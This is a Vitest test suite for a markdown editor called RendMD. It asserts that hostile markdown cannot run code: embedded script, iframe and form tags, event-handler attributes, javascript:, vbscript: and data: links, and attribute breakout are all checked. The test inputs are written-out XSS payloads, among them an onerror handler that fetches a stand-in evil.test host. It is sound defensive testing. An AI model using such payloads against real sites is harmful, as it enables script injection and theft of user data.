import { describe, expect, it, afterAll } from 'vitest';
import { Editor } from '@tiptap/core';
import { createEditorExtensions } from '@/components/Editor/extensions';

/**
 * Sanitisation of hostile documents.
 *
 * RendMD opens markdown the user did not write — files pulled from AI
 * transcripts, repositories, downloads. It also holds, at the same time, a
 * granted FileSystemDirectoryHandle over the user's notes folder.
 *
 * Those two facts together are why this file exists. Script execution here
 * would not be a defaced paragraph; it would be read access to every file in
 * the workspace, plus a network to send them over. "Can a document run code"
 * is therefore the security boundary of the whole application, and it gets
 * asserted rather than assumed.
 */

const editors: Editor[] = [];

function render(markdown: string): string {
  const editor = new Editor({
    extensions: createEditorExtensions({ isDark: true }),
    content: markdown,
  });
  editors.push(editor);
  return editor.getHTML();
}

/**
 * Parse output the way a browser would.
 *
 * Asserting against the HTML *string* is actively misleading here: escaped
 * markup like `&lt;img onerror=...&gt;` contains the substring "onerror="
 * while being completely inert text. What matters is the DOM the browser
 * actually builds, so that is what gets inspected.
 */
function parse(markdown: string): Document {
  return new DOMParser().parseFromString(render(markdown), 'text/html');
}

/**
 * Drop every character a browser ignores when resolving a URL scheme: space
 * and the C0 controls. `java<TAB>script:` and `java script:` both execute as
 * `javascript:` does, so a check against the literal prefix alone would miss
 * them.
 *
 * Done by code point rather than a regex, so no control characters have to be
 * written into this file.
 */
function stripIgnorable(value: string): string {
  return [...value].filter((character) => character.charCodeAt(0) > 0x20).join('');
}

afterAll(() => {
  for (const editor of editors) editor.destroy();
});

describe('raw HTML embedded in markdown', () => {
  it('never becomes a script element', () => {
    const doc = parse('# Title\n\n<script>alert(1)</script>\n\nAfter.');
    expect(doc.querySelectorAll('script')).toHaveLength(0);
    // It survives as visible text, which is the correct rendering of it.
    expect(doc.body.textContent).toContain('alert(1)');
  });

  it('never becomes an iframe', () => {
    const doc = parse('<iframe src="https://example.com/evil"></iframe>');
    expect(doc.querySelectorAll('iframe')).toHaveLength(0);
  });

  it('never produces an element carrying an event handler', () => {
    const doc = parse(
      '<img src=x onerror="fetch(\'https://evil.test\')">\n\n<div onmouseover="steal()">hi</div>',
    );

    expect(doc.querySelectorAll('[onerror], [onmouseover], [onload], [onclick]')).toHaveLength(0);
    // The markup did not become elements at all — it is escaped text.
    expect(doc.querySelectorAll('img')).toHaveLength(0);
  });

  it('never becomes object, embed, form or input elements', () => {
    const doc = parse(
      '<object data="evil.swf"></object>\n<embed src="evil">\n' +
        '<form action="https://evil.test"><input name=x></form>',
    );
    expect(doc.querySelectorAll('object, embed, form, input')).toHaveLength(0);
  });
});

describe('link protocols', () => {
  /** Schemes that execute rather than navigate. */
  const dangerous: [label: string, markdown: string][] = [
    ['javascript', '[x](javascript:alert(1))'],
    ['javascript in mixed case', '[x](JaVaScRiPt:alert(1))'],
    ['javascript split by whitespace', '[x](java\tscript:alert(1))'],
    ['base64 data html', '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript', '[x](vbscript:msgbox(1))'],
  ];

  it.each(dangerous)('neutralises %s', (_label, markdown) => {
    const anchor = parse(markdown).querySelector('a');
    const href = stripIgnorable((anchor?.getAttribute('href') ?? '').toLowerCase());

    expect(href.startsWith('javascript:')).toBe(false);
    expect(href.startsWith('vbscript:')).toBe(false);
    expect(href.startsWith('data:text/html')).toBe(false);
  });

  it('leaves ordinary links intact', () => {
    const doc = parse('[docs](https://example.com/page) and [mail](mailto:a@b.co)');
    const hrefs = [...doc.querySelectorAll('a')].map((a) => a.getAttribute('href'));

    expect(hrefs).toContain('https://example.com/page');
    expect(hrefs).toContain('mailto:a@b.co');
  });
});

describe('images', () => {
  it('keeps relative paths, which is how workspace assets are referenced', () => {
    const image = parse('![diagram](assets/diagram.png)').querySelector('img');
    expect(image?.getAttribute('src')).toBe('assets/diagram.png');
  });

  it('cannot break out of the title attribute into a handler', () => {
    const image = parse('![alt](x.png "title\\" onerror=\\"alert(1)")').querySelector('img');

    // The quote is escaped, so the payload stays inside the title value
    // rather than becoming a new attribute.
    expect(image?.hasAttribute('onerror')).toBe(false);
    expect(image?.getAttribute('title')).toContain('onerror');
  });
});

describe('code blocks', () => {
  it('treats markup inside a fence as text, not markup', () => {
    const doc = parse('```html\n<script>alert(1)</script>\n```');

    expect(doc.querySelectorAll('script')).toHaveLength(0);
    expect(doc.body.textContent).toContain('<script>alert(1)</script>');
  });
});
